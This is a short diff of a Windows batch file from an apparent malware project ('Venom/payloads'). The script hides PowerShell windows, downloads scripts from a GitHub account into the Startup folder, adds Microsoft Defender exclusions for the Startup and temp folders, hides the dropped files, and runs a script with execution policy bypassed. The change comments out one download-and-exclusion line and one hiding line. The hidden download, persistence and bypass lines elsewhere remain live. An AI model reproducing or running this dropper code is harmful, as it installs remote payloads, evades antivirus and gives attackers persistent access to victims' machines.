@@ -30,9 +30,9 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 
 attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/scheduler.ps1 -OutFile SSzsjvouBw.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
+@REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/scheduler.ps1 -OutFile SSzsjvouBw.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
 
-attrib +h "%STARTUP%/SSzsjvouBw.ps1"
+@REM attrib +h "%STARTUP%/SSzsjvouBw.ps1"
 
 powershell powershell.exe -windowstyle hidden -ep bypass "./BVrAihDwJNvc.ps1"
 
